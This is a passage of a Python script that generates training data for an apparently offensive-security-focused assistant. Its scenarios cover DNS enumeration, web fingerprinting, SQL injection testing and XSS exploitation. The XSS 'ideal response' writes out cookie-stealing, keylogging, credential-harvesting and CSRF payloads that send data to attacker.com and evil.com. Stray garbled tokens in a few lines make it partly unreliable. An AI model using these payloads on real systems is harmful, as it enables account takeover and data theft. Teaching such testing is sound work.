- Shodan, Censys, Fofa: search engines for internet-connected devices
- PTR Records: reverse DNS lookups on discovered IP ranges

**Public DNS records (without authoritative query):**
- `dig target.com ANY` — may get some records (but many servers block ANY now)
- `dig target.com MX` — mail servers
- `dig target.com NS` — name servers (often reveal infrastructure)
- `dig target.com TXT` — TXT records (SPF, DKIM, verification, sometimes clues)

**Subdomain discovery from certificates:**
- Enumerate CT logs for all certificates → extract subdomains from SAN/CN fields
- Tools: `certspotter`, `ctfr`, `subfinder` (uses multiple passive sources)

**ACTIVE METHODS (directly querying target's DNS):**

**Standard enumeration:**
```bash
# Basic records
dig target.com A           # IPv4 addresses
dig target.com AAAA        # IPv6 addresses
dig target.com MX          # Mail servers
dig target.com NS          # Name servers
dig target.com TXT         # TXT records (SPF, DMARC, etc.)
dig target.com SOA         # Start of Authority
dig target.com CNAME       # Canonical names

# ANY record (may be blocked)
dig target.com ANY

# Trace the resolution path
dig +trace target.com
```

**Brute-force subdomain discovery:**
```bash
# Using dnsrecon
dnsrecon -d target.com

# Using subbrute (wordlist-based)
subbrute target.com

# Using gobuster DNS mode
gobuster dns -d target.com -w subdomains.txt

# Using ffuf for DNS
ffuf -dns -u target.com -w subdomains.txt
```

**Zone transfer attempt (AXFR):**
```bash
# Try zone transfer (often blocked but worth checking)
dig target.com AXFR @ns1.target.com
dig target.com AXFR @ns2.target.com
dnsrecon -d target.com -t axfr
```

**DNS reconnaissance scripting (nmap):**
```bash
nmap --script dns-brute -p 53 --script-args dns-brute.domain=target.com <dns-server>
nmap --script dns-zone-transfer -p 53 <dns-server>
nmap --script dns-nsid,dns-dist-sev,dns-bind版本 -p 53 <dns-server>
```

**Tools summary:**
- `dig` / `host` / `nslookup` — basic DNS queries
- `dnsrecon` — comprehensive DNS enumeration (brute force, zone transfer, SRV, etc.)
- `subfinder` — passive subdomain discovery (combines multiple sources)
- `amass` — advanced subdomain enumeration (OWASP project, very comprehensive)
- `gobuster dns` — DNS brute-forcing with wordlists
- `fierce` — DNS reconnaissance (older but useful)
- `crt.sh` / Certificate Transparency — passive subdomain discovery
- `shodan` / `censys` — search engines for exposed services

**What I'm looking for:**
1. **Subdomains** — each subdomain is a potential attack surface. dev.target.com, api.target.com, admin.target.com, staging.target.com, mail.target.com, etc.
2. **Mail servers (MX)** — can indicate email infrastructure, potential for email-based attacks
3. **Name servers (NS)** — reveals DNS infrastructure, potential for zone transfer
4. **TXT records** — SPF records show mail servers, DKIM reveals keys, verification strings can reveal other services
5. **CNAME records** — aliasing can reveal hidden services
6. **A/AAAA records** — IP addresses to target
7. **Zone transfers** — if allowed, gives entire DNS zone (all records)

**The goal:** Build a complete map of the target's DNS footprint. Every subdomain is a potential entry point. The more subdomains found, the larger the attack surface.
</reasoning>

<solution>
**Passive (no direct DNS interaction):**
```bash
# Certificate Transparency — BEST passive method
curl "https://crt.sh/?q=target.com&output=json"       # All certs for domain
# Or use tools: crt.sh website, certspotter, ctfr

# Search engines
# Google: site:target.com
# Shodan: shodan host <IP>
# Censys: certificates for target.com

# DNS History
# SecurityTrails, VirusTotal, PassiveDNS databases
```

**Active (direct DNS queries):**
```bash
# Basic enumeration
dig target.com A MX NS TXT SOA CNAME ANY
dig +trace target.com                               # Trace resolution

# DNS brute-forcing
dnsrecon -d target.com                              # Comprehensive
gobuster dns -d target.com -w subdomains.txt        # Wordlist brute
subfinder -d target.com                             # Passive + active

# Zone transfer attempt
dig target.com AXFR @ns1.target.com
dnsrecon -d target.com -t axfr

# Nmap DNS scripts
nmap --script dns-brute,dns-zone-transfer -p 53 <dns-server>
```

**Tools:**
- `dig`, `host`, `nslookup` — basic queries
- `dnsrecon` — comprehensive DNS enum
- `subfinder`, `amass` — subdomain discovery
- `gobuster dns` — DNS brute-forcing
- `crt.sh` / CT logs — passive subdomain discovery
- `shodan`, `censys` — search exposed services

**Goal:** Find ALL subdomains, mail servers, name servers, IP addresses. Each subdomain = potential attack surface. Zone transfer = jackpot (entire DNS zone).
</solution>"""
    },
    {
        "domain": "Network Reconnaissance & Attack Surface Mapping",
        "difficulty": "intermediate",
        "title": "Web Application Reconnaissance — Tech Stack Fingerprinting",
        "question": "You've found a web application at https://target.com. Describe how you would identify: (1) The web server software and version, (2) The application framework (WordPress, Django, Rails, custom, etc.), (3) The programming language, (4) The frontend framework (React, Vue, Angular, jQuery, etc.), (5) Any CDN or WAF in front. Be specific about techniques and HTTP headers to examine.",
        "ideal_response": """<reasoning>
Tech stack fingerprinting is essential because it tells you: what vulnerabilities to look for, what tools to use, what misconfigurations to expect, and what the development practices might be.

**1. Web Server Software & Version:**

**HTTP Headers to examine:**
- `Server:` header — most direct. Examples: `Apache/2.4.49 (Ubuntu)`, `nginx/1.18.0`, `Microsoft-IIS/10.0`, `Caddy`, `LiteSpeed`.
- Note: Server header can be removed or spoofed. Absence doesn't mean it's not there.

**Techniques:**
```bash
curl -I https://target.com          # GET headers
curl -I -X HEAD https://target.com  # HEAD request
curl -v https://target.com          # Full request, see all headers
```

**TLS/SSL fingerprinting:**
- `nmap --script ssl-cert,ssl-enum-ciphers -p 443 target.com` — TLS config
- Different servers have different TLS behavior (cipher ordering, support)
- `sslscan target.com:443` — detailed SSL/TLS analysis

**Default files/pages:**
- `curl https://target.com/server-status` — Apache mod_status (if enabled)
- `curl https://target.com/nginx_status` — nginx status
- `curl https://target.com/robots.txt` — may reveal framework specifics
- `curl https://target.com/.well-known/` — well-known URI endpoints
- Error pages: custom vs default error pages reveal server type

**WAF detection:**
- `wafw00f https://target.com` — automated WAF identification
- Test with malicious payloads: if blocked, something is filtering
- Check headers: `X-WAF-Echo`, `X-Cf-War-Type`, `X-Sucuri-ID`, etc.

**CDN detection:**
- Check IP: is it a CDN IP? (Cloudflare, Akamai, Fastly, AWS CloudFront)
- `curl https://target.com` — check `Server:` header for CDN identifiers
- DNS: is the A record a CDN IP?
- `curl -v https://target.com` — look for CDN-specific headers (`CF-RAY`, `X-Ak-` headers, etc.)

**2. Application Framework:**

**URL structure clues:**
- `/wp-admin`, `/wp-content`, `/wp-includes` — WordPress
- `/wp-login.php` — WordPress login
- `/administrator/` — Joomla
- `/sites/default/` — Drupal
- `/themes/`, `/modules/` — Drupal
- `/bundles/`, `/app/` — Symfony
- `/assets/` with specific patterns — various frameworks
- `/robots.txt` — often reveals framework and disallowed paths
- `sitemap.xml` — reveals URL patterns

**HTTP Headers:**
- `X-Powered-By:` — reveals framework/language. Examples: `PHP/7.4.3`, `Express`, `ASP.NET`, ` 기인합니다`.
- `Set-Cookie:` — cookie names reveal frameworks. `PHPSESSID` = PHP, `JSESSIONID` = Java, `ASP.NET_SessionId` = .NET, `__cfduid` = Cloudflare.
- `X-Drupal-Cache:` — Drupal
- `X-Frame-Options`, `X-Content-Type-Options` — security headers (not framework-specific but indicate maturity)

**Files and directories:**
```bash
curl https://target.com/wp-content/plugins/     # WordPress plugins
curl https://target.com/wp-includes/js/jquery/  # WordPress jQuery
curl https://target.com/sites/all/libraries/    # Drupal libraries
curl https://target.com/CHANGELOG.txt           # Some frameworks have CHANGELOG
curl https://target.com/readme.html             # Some installations have readme
```

**Generator meta tag:**
```bash
curl https://target.com | grep -i generator
# <meta name="generator" content="WordPress 5.8" />
# <meta name="generator" content="Joomla! 3.9.24" />
```

**Error pages:**
- Trigger errors: add `'`, `?`, `%`, or malformed input
- Default framework error pages reveal: stack traces, framework name, version
- PHP errors: `Fatal error in /var/www/...` — reveals path and PHP
- Django errors: Django debug page with framework version
- Rails errors: Rails stack trace

**3. Programming Language:**

**inferred from framework (above), plus:**
- `X-Powered-By: PHP/7.4.3` — PHP
- `X-Powered-By: ASP.NET` — C#/.NET
- `X-Powered-By: Express` — Node.js
- `Set-Cookie: JSESSIONID` — Java
- `Set-Cookie: PHPSESSID` — PHP
- `Set-Cookie: ASP.NET_SessionId` — .NET
- File extensions in URLs: `.php`, `.asp`, `.aspx`, `.jsp`, `.do`, `.action`
- Error messages: PHP fatal errors, Java stack traces, .NET yellow screens

**4. Frontend Framework:**

**HTML source analysis:**
```bash
curl https://target.com | grep -i "vue\|react\|angular\|jquery"
# Look for framework-specific attributes:
# v-*, ng-*, data-reactroot, __NEXT_DATA__, window.__VAERS_STATE__
```

**JavaScript files:**
```bash
# Find JS files and analyze
curl https://target.com | grep "\.js" | grep -o 'src="[^"]*\.js"'
# Check JS files for framework signatures:
# webpack, react, vue, angular in filenames or content
# Look for __react$, __vue__, window.ng, etc.
```

**Network tab (if using browser):**
- Check loaded JS files for framework signatures
- React: `__NEXT_DATA__`, `react`, `react-dom` in JS
- Vue: `vue.js`, `Vue`, `__vue_repo`
- Angular: `angular.js`, `ng-app`, `ng-controller`
- jQuery: `jquery.js`, `$.`, `jQuery`

**5. CDN/WAF Detection:**

**CDN:**
- IP belongs to known CDN range (Cloudflare: 103.21.0.0/16, etc.)
- DNS resolves to CDN edge server
- Headers: `CF-RAY` (Cloudflare), `X-Cache: HIT` (various CDNs), `X-Ak-*` (Akamai)
- `curl -v` shows CDN headers

**WAF:**
- `wafw00f target.com` — automated detection
- Send test payloads: SQL injection attempt, XSS attempt — if blocked with WAF-specific message, identified
- Check response headers for WAF identifiers
- Behavior: requests with `<script>` blocked, SQL keywords blocked, etc.

**Putting it together — example analysis:**
```bash
curl -I https://target.com
# HTTP/2 200
# server: cloudflare
# CF-RAY: 8372b8c3d4e5f6g7h8i9j0k
# CF-Cache-Status: DYNAMIC
# X-Powered-By: PHP/8.1.2
# Set-Cookie: wp_session=abc123; path=/
# X-Frame-Options: SAMEORIGIN

Analysis:
- CDN: Cloudflare (CF-RAY, CF-Cache-Status, server: cloudflare)
- Language: PHP 8.1.2 (X-Powered-By)
- Framework: WordPress (wp_session cookie)
- WAF: None detected yet (need wafw00f)
- Server behind CDN: unknown (Cloudflare masks it)
```
</reasoning>

<solution>
**1. Web Server — HTTP Headers + TLS:**
```bash
curl -I https://target.com              # GET headers
curl -v https://target.com              # Full exchange, all headers
nmap --script ssl-cert,ssl-enum-ciphers -p 443 target.com  # TLS fingerprinting
wafw00f https://target.com              # WAF detection
```

**Key headers:** `Server:`, `X-Powered-By:`, `Set-Cookie:`, any WAF/CDN headers (`CF-RAY`, `X-Cf-*`)

**2. Framework — URL patterns + cookies + generator tag:**
```bash
curl https://target.com/robots.txt      # Often reveals framework
curl https://target.com/sitemap.xml     # URL patterns
curl https://target.com | grep -i generator   # Meta generator tag
curl https://target.com/wp-admin/      # Test WordPress
```

**Common indicators:**
- WordPress: `/wp-admin`, `/wp-content`, `wp_session` cookie
- Drupal: `/sites/default`, `X-Drupal-Cache`
- Joomla: `/administrator/`
- Symfony: `/bundles/`, `/app_`
- Django: `csrftoken` cookie, Django error pages

**3. Language — X-Powered-By + cookies + file extensions:**
- PHP: `X-Powered-By: PHP/` or `PHPSESSID` cookie
- Java: `JSESSIONID` cookie
- .NET: `ASP.NET_SessionId` cookie
- Node.js: `X-Powered-By: Express` or similar
- Python: framework-specific (Django, Flask)

**4. Frontend — HTML/JS source analysis:**
```bash
curl https://target.com | grep -iE "vue|react|angular|jquery|webpack"
curl https://target.com | grep -o 'src="[^"]*\.js"'  # JS files
```

**Framework markers:**
- React: `__NEXT_DATA__`, `data-reactroot`
- Vue: `v-*` attributes, `__vue_repo`
- Angular: `ng-app`, `ng-controller`, `ng-*`
- jQuery: `jquery.js`, `$.` in JS

**5. CDN/WAF:**
- CDN: IP belongs to CDN range, `CF-RAY`/`X-Cache`/`X-Ak-*` headers
- WAF: `wafw00f` tool, test with malicious payloads, WAF-specific headers

**Complete example analysis workflow:**
1. `curl -I` — get headers (server, powered-by, cookies, CDN/WAF headers)
2. `curl robots.txt` — framework hints, disallowed paths
3. `curl | grep generator` — CMS/framework version
4. `wafw00f` — WAF detection
5. Test framework-specific paths (`/wp-admin`, `/sites/default`)
6. Frontend: inspect JS files for framework signatures
</solution>"""
    },
    # === VULNERABILITY ANALYSIS (8 scenarios) ===
    {
        "domain": "Vulnerability Analysis & Exploitation Reasoning",
        "difficulty": "beginner",
        "title": "SQL Injection Vulnerability Assessment",
        "question": "You're testing a login form at https://target.com/login. The form sends POST data: username=abc&password=xyz. Describe how you would test for SQL injection vulnerabilities. Include: (1) What payloads you'd try, (2) How you'd determine if injection is possible, (3) What types of SQL injection might exist, (4) How you'd verify without causing damage.",
        "ideal_response": """<reasoning>
SQL injection testing requires systematic approach — test inputs, observe responses, verify without causing damage.

**Testing approach — start with low-impact tests:**

**Step 1: Basic test — single quote**
- Input: `username='` or `username=abc'`
- What to look for: SQL error messages, unexpected behavior, different response
- If error: "You have an error in your SQL syntax..." — CONFIRMED injection point
- If no error but behavior changes: may still be injectable (blind)

**Step 2: Comment testing — determine query structure**
- Input: `username=abc'--` or `username=abc' #`
- What this does: comments out the rest of the query
- If `abc'--` logs you in (when abc is not a valid user): the query structure is `SELECT * FROM users WHERE username='[input]' AND password='[input]'`
- The `--` comments out the password check → authentication bypass

**Step 3: Determine injection type:**

**Error-based SQLi:**
- Input: `'` or `' OR '1'='1` or `UNION SELECT` payloads
- Look for: SQL error messages in response
- Payload examples:
  - `'` — basic test
  - `' OR '1'='1` — always true condition
  - `' UNION SELECT NULL,NULL--` — test column count
  - `' UNION SELECT 1,version(),3--` — extract data

**Blind SQLi (boolean-based):**
- Input: `' OR 1=1--` vs `' OR 1=2--`
- If response differs between true and false conditions: blind SQLi
- Payload: `' AND 1=1--` (normal) vs `' AND 1=2--` (different response)
- Use to extract data character by character with `SUBSTRING()`, `ASCII()`

**Time-based blind SQLi:**
- Input: `' OR SLEEP(5)--` or `' OR BENCHMARK(1000000,SHA1('test'))--`
- If response is delayed by 5 seconds: time-based blind SQLi
- Use to extract data when no response difference is visible
- MySQL: `SLEEP(5)`, PostgreSQL: `pg_sleep(5)`, SQL Server: `WAITFOR DELAY '0:0:5'`

**UNION-based SQLi:**
- Input: `' UNION SELECT NULL,NULL--` to find column count
- Then: `' UNION SELECT 1,version(),3--` to extract data
- Need to know column count first (use ORDER BY or UNION with increasing NULLs)

**Step 4: VERIFY without damage:**

**Safe tests (read-only, no modification):**
- `' OR '1'='1` — test boolean behavior (no data modification)
- `' UNION SELECT NULL,NULL--` — test UNION (no modification)
- `' AND 1=1--` vs `' AND 1=2--` — boolean test (no modification)
- `' OR SLEEP(5)--` — time test (no modification, but can cause load)
- `SELECT version()` via UNION — read-only system info

**Tests to AVOID (can cause damage):**
- `DROP TABLE`, `DELETE FROM`, `UPDATE`, `INSERT` — destructive
- `UNION SELECT` with large data — can cause performance issues
- Stacked queries (`; DROP TABLE users--`) — can execute arbitrary statements
- Out-of-band (OOB) DNS/HTTP requests — can leave traces

**Step 5: Determine database type:**

Different databases have different syntax:
- MySQL: `SLEEP(5)`, `LIMIT`, `CONCAT()`, `information_schema`
- PostgreSQL: `pg_sleep(5)`, `LIMIT`, `||` for concatenation, `information_schema`
- SQL Server: `WAITFOR DELAY`, `TOP`, `+ ` for concatenation, `information_schema`
- Oracle: `DBMS_PIPE.RECEIVE_MESSAGE`, `FROM dual`, `information_schema`

Test which one:
- `' UNION SELECT version()--` (MySQL/PostgreSQL)
- `' UNION SELECT @@version--` (MySQL)
- `' UNION SELECT version();--` (PostgreSQL)
- `' UNION SELECT banner FROM v$version--` (Oracle)
- Error messages often reveal the database type

**Step 6: Systematic testing checklist:**
1. Test each input parameter individually
2. Test with `'`, `"`, `\`, `--`, `#`, `/*`
3. Test boolean conditions: `' OR 1=1--`, `' OR 1=2--`
4. Test time-based: `SLEEP(5)` / `pg_sleep(5)` / `WAITFOR`
5. Test UNION: find column count, then extract data
6. Check for WAF: are payloads being blocked?
7. Check for parameterized queries: are inputs properly escaped?

**The most important thing:** Start with READ-ONLY tests. Never test destructive payloads on a system you don't have permission to test. Start with `'` — if you get an error, you know it's vulnerable. If you don't get an error, try boolean and time-based blind techniques.
</reasoning>

<solution>
**Safe SQL Injection Testing Approach:**

**Phase 1: Basic Detection (no damage)**
```bash
# Test with single quote
curl -X POST https://target.com/login -d "username='&password=test"
curl -X POST https://target.com/login -d "username=abc'&password=test"

# Test with tautology
curl -X POST https://target.com/login -d "username=' OR '1'='1&password=test"
curl -X POST https://target.com/login -d "username=admin'--&password=test"
```

**What to look for:**
- SQL error messages → error-based SQLi
- Login succeeds with invalid credentials → auth bypass (likely SQLi)
- Different response between `' OR 1=1--` and `' OR 1=2--` → blind SQLi
- Response delayed by 5s with `SLEEP(5)` → time-based blind SQLi

**Phase 2: Determine Injection Type**
- Error-based: SQL errors in response → extract info from errors
- Blind boolean: true/false conditions produce different responses
- Blind time-based: different response times for different conditions
- UNION-based: can append SELECT statements to extract data

**Phase 3: Database Identification**
- MySQL: `SLEEP(5)`, `@@version`, `information_schema`
- PostgreSQL: `pg_sleep(5)`, `version()`, `information_schema`
- SQL Server: `WAITFOR DELAY`, `@@version`, `information_schema`
- Oracle: `DBMS_PIPE.RECEIVE_MESSAGE`, `FROM dual`

**Phase 4: Safe Verification**
- `' OR '1'='1` — boolean test (read-only)
- `' UNION SELECT NULL,NULL--` — column count (read-only)
- `' UNION SELECT 1,version(),3--` — extract version (read-only)
- `' AND SLEEP(5)--` — time test (read-only, but load)
- AVOID: DROP, DELETE, UPDATE, INSERT, stacked queries

**Phase 5: WAF Check**
- Are payloads being blocked?
- Does the WAF identify and block SQLi patterns?
- If blocked: may need different encoding, case variation, or comments

**Key principle:** Start with the simplest test (`'`) — if it causes an error, you've confirmed injection. Then use read-only techniques to understand the vulnerability. Never test destructive payloads.
</solution>"""
    },
    {
        "domain": "Vulnerability Analysis & Exploitation Reasoning",
        "difficulty": "intermediate",
        "title": "XSS Vulnerability Classification and Exploitation",
        "question": "You find a reflected XSS in a search function: https://target.com/search?q=test displays 'No results for test' where 'test' is not escaped. Describe: (1) How you'd verify it's actually XSS, (2) What types of XSS this could be, (3) What payloads you'd use to prove exploitability, (4) How you'd escalate from proof-of-concept to something more impactful, (5) What defenses would stop this.",
        "ideal_response": """<reasoning>
XSS verification and exploitation requires understanding the context (where the input is reflected), the type of XSS, and what's possible within the browser's security model.

**1. Verification — prove it's actually XSS:**

**Basic test:**
- Input: `<script>alert(1)</script>`
- If alert(1) fires: XSS confirmed
- If not: the input might be filtered, or it's reflected in a context where script tags aren't executed

**Context matters — where is the input reflected?**
- In HTML body: `<script>alert(1)</script>` should work (if not filtered)
- In an attribute: `value="test"` — need to break out: `" onmouseover="alert(1)`
- In JavaScript: `var q = "test";` — need to break out: `"; alert(1); //`
- In URL: reflected in a link — need to consider the context

**HTML context tests:**
```bash
# Test script tag
curl "https://target.com/search?q=<script>alert(1)</script>"

# Test event handler
curl "https://target.com/search?q=<img src=x onerror=alert(1)>"

# Test SVG
curl "https://target.com/search?q=<svg onload=alert(1)>"

# Test if filtered — try alternate encodings
curl "https://target.com/search?q=<ScRiPt>alert(1)</ScRiPt>"
curl "https://target.com/search?q=%3Cscript%3Ealert(1)%3C/script%3E"
curl "https://target.com/search?q=<script>alert(1)</script>"
```

**Attribute context tests:**
```bash
# If reflected in an attribute value
curl "https://target.com/search?q=\" onmouseover=\"alert(1)"
curl "https://target.com/search?q=' onmouseover='alert(1)"
curl "https://target.com/search?q=><script>alert(1)</script>"
```

**JavaScript context tests:**
```bash
curl "https://target.com/search?q=\";alert(1);//"
curl "https://target.com/search?q=';alert(1);//"
```

**2. Types of XSS:**

**Reflected XSS (what we have here):**
- Input is reflected in the response immediately
- Requires victim to click a crafted link
- Impact: session hijacking, credential theft, redirect, defacement
- Each victim needs to be sent a malicious link

**Stored XSS:**
- Input is stored (database, file) and reflected to all users
- More dangerous — affects all users who view the content
- Impact: widespread — all users affected
- Requires: find input that gets stored (comments, profiles, posts, etc.)

**DOM-based XSS:**
- Vulnerability is in client-side JavaScript, not server
- Input is processed by JavaScript and inserted into DOM
- Server may never see the malicious input
- Impact: same as reflected, but can be harder to detect/fix

**3. Payloads for proving exploitability:**

**Proof of concept (harmless):**
- `<script>alert(1)</script>` — basic
- `<img src=x onerror=alert(1)>` — event handler
- `<svg onload=alert(1)>` — SVG onload
- `<body onload=alert(1)>` — body onload

**More impactful PoC (still safe):**
- `<script>alert(document.cookie)</script>` — shows cookies (session hijacking potential)
- `<script>fetch('https://attacker.com/?c='+document.cookie)</script>` — exfiltrate cookies
- `<script>new Image().src='https://attacker.com/?c='+document.cookie</script>` — exfiltrate via image

**Escalation payloads (more impactful):**

**Session hijacking:**
```html
<script>
  fetch('https://attacker.com/steal?cookie=' + document.cookie);
</script>
```
- Steals session cookies — attacker can impersonate victim

**Credential harvesting:**
```html
<script>
  // Overlay fake login form
  document.body.innerHTML = '<form action="https://attacker.com/"><input name="user"><input type=password name="pass"><button>Submit</button></form>';
</script>
```
- Displays fake login form — captures credentials

** redirect:**
```html
<script>
  window.location = 'https://evil.com/phishing';
</script>
```
- Redirects victim to phishing site

**Keylogging:**
```html
<script>
  document.addEventListener('keydown', function(e) {
    fetch('https://attacker.com/k?k=' + e.key);
  });
</script>
```
- Captures keystrokes — passwords, sensitive data

**XMLHttpRequest/fetch abuse:**
```html
<script>
  // Access victim's API on behalf of victim
  fetch('/api/user/profile').then(r => r.json()).then(data => {
    fetch('https://attacker.com/?data=' + JSON.stringify(data));
  });
</script>
```
- Accesses victim's data from the API (using victim's session)

**CSRF via XSS:**
```html
<script>
  fetch('/api/change-email', {
    method: 'POST',
    credentials: 'include',
    headers: {'Content-Type': 'application/x-www-form-urlencoded'},
    body: 'newemail=attacker@evil.com'
  });
</script>
```
- Performs actions as the victim (change email, transfer funds, etc.)

**4. Escalation path:**

PoC (alert) → prove cookie access → exfiltrate cookies → session hijacking → access victim's account → perform actions as victim → data theft, privilege escalation, lateral movement

**5. Defenses:**

**Input validation:**
- Escape HTML special characters: `<` → `&lt;`, `>` → `&gt;`, `&` → `&amp;`, `"` → `&quot;`, `'` → `&#x27;`
- Use proper encoding for context: HTML body, attribute, JavaScript, URL

**Output encoding:**
- HTML entity encoding for HTML context
- JavaScript encoding for JavaScript context
- URL encoding for URL context
- Use framework's built-in escaping (most modern frameworks do this by default)

**Content Security Policy (CSP):**
- `Content-Security-Policy: default-src 'self'` — prevents inline scripts
- Blocks `<script>` tags, inline event handlers, `eval()`
- Even if XSS exists, CSP can prevent exploitation

**HttpOnly cookies:**
- `Set-Cookie: session=abc; HttpOnly` — JavaScript cannot access cookies
- Prevents cookie theft via XSS (but not other attacks)

**X-XSS-Protection:**
- `X-XSS-Protection: 1; mode=block` — legacy browser XSS filter
- Deprecated but still useful for older browsers

**The defense in depth approach:** Input validation + output encoding + CSP + HttpOnly cookies + X-XSS-Protection. No single defense is perfect — layers are needed.
</reasoning>

<solution>
**Verification:**
```bash
# Basic test
curl "https://target.com/search?q=<script>alert(1)</script>"
curl "https://target.com/search?q=<img src=x onerror=alert(1)>"
curl "https://target.com/search?q=<svg onload=alert(1)>"

# If filtered, try variants
curl "https://target.com/search?q=<ScRiPt>alert(1)</ScRiPt>"
curl "https://target.com/search?q=%3Cscript%3Ealert(1)%3C/script%3E"
```

**Context determines payload:**
- HTML body: `<script>alert(1)</script>` or `<img src=x onerror=alert(1)>`
- Attribute: `" onmouseover="alert(1)` (break out of attribute)
- JavaScript: `"; alert(1); //` (break out of string)

**Escalation path:**
1. `alert(1)` — prove XSS exists
2. `alert(document.cookie)` — prove cookie access
3. `fetch('https://attacker.com/?c='+document.cookie)` — exfiltrate cookies
4. Use stolen session → access victim's account
5. Perform actions as victim (CSRF via XSS, data theft, etc.)

**Impactful payloads:**
- Cookie theft: `new Image().src='https://attacker.com/?c='+document.cookie`
- API data theft: `fetch('/api/user').then(r=>fetch('https://attacker.com/?d='+r.text()))`
- CSRF via XSS: `fetch('/api/change-email',{method:'POST',credentials:'include',body:'newemail=hacker@evil.com'})`
- Redirect: `window.location='https://evil.com/phishing'`
- Keylogging: `document.addEventListener('keydown',e=>fetch('https://attacker.com/k?k='+e.key))`

**Defenses:**
- Output encoding (HTML entities for HTML context, JS encoding for JS context)
- Content-Security-Policy: `default-src 'self'` (blocks inline scripts)
- HttpOnly cookies (prevents cookie theft via JavaScript)
- Input validation (whitelist allowed characters)
- Framework-built-in escaping (React, Django, etc. escape by default)
</solution>"""
    },
]

# ===========================================================================
# Generate SFT examples
# ===========================================================================

def generate_sft():
    """Generate SFT curriculum entries. Start from existing + add new."""
    output_path = OUTPUT_DIR / "sft_curriculum.jsonl"
    existing = []
    
    # Read existing if present
    if output_path.exists():
        with open(output_path) as f:
            content = f.read().strip()
            if content:
                existing = [json.loads(line) for line in content.split("\n") if line.strip()]
    
    print(f"Existing SFT examples: {len(existing)}")
    
    # Generate new examples
    new_examples = []
    for i, scenario in enumerate(SFT_SCENARIOS):
        entry = {
            "messages": [
                {"role": "system", "content": SYSTEM},
                {"role": "user", "content": f"DOMAIN: {scenario['domain']}\nDIFFICULTY: {scenario['difficulty']}\nTITLE: {scenario['title']}\n\n{scenario['question']}"},
                {"role": "assistant", "content": scenario["ideal_response"]}
            ],
            "metadata": {
                "domain": scenario["domain"],
                "difficulty": scenario["difficulty"],
                "title": scenario["title"],
                "generated": "2026-08-18",
                "type": "sft"
            }
        }
        new_examples.append(entry)
        print(f"  Generated SFT #{i+1}: {scenario['title']} [{scenario['difficulty']}]")
    
    # Combine and write
    all_entries = existing + new_examples
    with open(output_path, "w") as f:
        for entry in all_entries:
            f.write(json.dumps(entry) + "\n")
    
    print(f"\nTotal SFT examples: {len(all_entries)}")
    print(f"Written to: {output_path}")
    return len(all_entries)

# ===========================================================================
# GRPO EXAMPLES (100+)
# ===========================================================================

GRPO_SCENARIOS = []

# Generate GRPO examples — questions with verifiable answers + reward signals

# === GRPO: Security knowledge questions (20 questions) ===
security_qa = [
    ("What is the CVE number for the Apache path traversal vulnerability in version 2.4.49?", "CVE-2021-41773", "Apache 2.4.49 path traversal is CVE-2021-41773 (and CVE-2021-42013 for the fix bypass)."),
    ("What port does SSH typically listen on?", "22", "SSH default port is 22/tcp."),
    ("What is the default port for MySQL?", "3306", "MySQL default port is 3306/tcp."),
    ("What does the 'Server:' HTTP header typically reveal?", "Web server software and version", "The Server header reveals the web server software (Apache, nginx, IIS) and often the version."),
    ("What is the name of the Apache path traversal vulnerability in 2.4.49?", "CVE-2021-41773", "Apache 2.4.49 path traversal is CVE-2021-41773."),
    ("What does nmap -O do?", "OS detection", "nmap -O performs TCP/IP stack fingerprinting to determine the target operating system."),
    ("What is the primary risk of exposing MySQL (port 3306) to the internet?", "Database compromise / data breach", "Exposed MySQL allows attackers to attempt authentication and potentially access or manipulate data. It should be restricted to internal networks."),
    ("What HTTP status code indicates 'Not Found'?", "404", "HTTP 404 means the requested resource was not found."),
    ("What is the difference between reflected and stored XSS?", "Reflected is immediate (in response); stored is saved and served to others later", "Reflected XSS: input reflected in response immediately, requires victim to click link. Stored XSS: input stored (DB/file) and served to all users who view the content."),
    ("What is the default SSH port?", "22", "SSH listens on port 22/tcp by default."),
    ("What command would you use for passive OS fingerprinting?", "p0f", "p0f is a passive OS fingerprinting tool that analyzes TCP SYN packets without sending any probes."),
    ("What is the CVE for the Apache mod_proxy SSRF vulnerability?", "CVE-2021-40438", "Apache mod_proxy SSRF is CVE-2021-40438, affecting Apache 2.4.49 and earlier."),
    ("What port does RDP use?", "3389", "Remote Desktop Protocol uses port 3389/tcp by default."),
    ("What is the purpose of a DMZ in network architecture?", "Isolate public-facing services from internal network", "A DMZ (Demilitarized Zone) hosts public-facing services (web, mail) and isolates them from the internal network with firewalls on both sides."),
    ("What does the 'Set-Cookie: HttpOnly' flag prevent?", "JavaScript access to the cookie", "The HttpOnly flag prevents client-side JavaScript from accessing the cookie, mitigating cookie theft via XSS."),
    ("What is the difference between TCP connect scan (-sT) and SYN scan (-sS)?", "Connect scan completes the full TCP handshake; SYN scan sends only SYN and analyzes response without completing handshake", "SYN scan (-sS) is stealthier because it doesn't complete the handshake. Connect scan (-sT) completes the full 3-way handshake and is more reliable but more visible in logs."),
    ("What is the default port for DNS?", "53", "DNS uses port 53/tcp and 53/udp."),
    ("What tool would you use to check for known exploits for a specific software version?", "searchsploit", "searchsploit searches the Exploit-Database for known exploits matching a software name and version."),
    ("What is the X-Powered-By header used for?", "Reveals the backend technology/framework", "X-Powered-By often reveals the backend language or framework (e.g., PHP/7.4.3, Express, ASP.NET). It should be removed in production."),
    ("What is GraphQL introspection and why is it a security concern?", "It exposes the full schema (queries, mutations, types); can be disabled in production", "GraphQL introspection queries expose the entire API schema. If enabled in production, attackers can understand all available queries and plan attacks."),
]

for q, a, explanation in security_qa:
    GRPO_SCENARIOS.append({
        "domain": "Security Knowledge",
        "question": q,
        "ideal_answer": a,
        "explanation": explanation,
        "reward_type": "exact_match",
        "reward_description": f"Answer must be: {a}"
    })

# === GRPO: Reasoning scenarios (20 questions) ===
reasoning_qa = [
    ("A web server responds with 'Server: Apache/2.4.49 (Ubuntu)'. What specific vulnerability should you check for first and why?", "CVE-2021-41773 (Apache path traversal) because version 2.4.49 is specifically affected", "Apache 2.4.49 is specifically vulnerable to CVE-2021-41773 path traversal. This is the FIRST thing to check because it's a critical, version-specific vulnerability that requires no authentication."),
    ("You scan a target and find ports 22, 80, 443, 3306, 3389 open. The MySQL port (3306) should not be internet-facing. What is your assessment and what should you investigate?", "MySQL exposure is a critical finding — investigate if it's actually accessible, what credentials are required, and whether it represents a misconfiguration", "MySQL on port 3306 should almost never be directly accessible from the internet. This is either a misconfiguration or a finding. Investigate: can I connect? Are there credentials? What privileges? Is FILE privilege granted? This is a high-priority finding."),
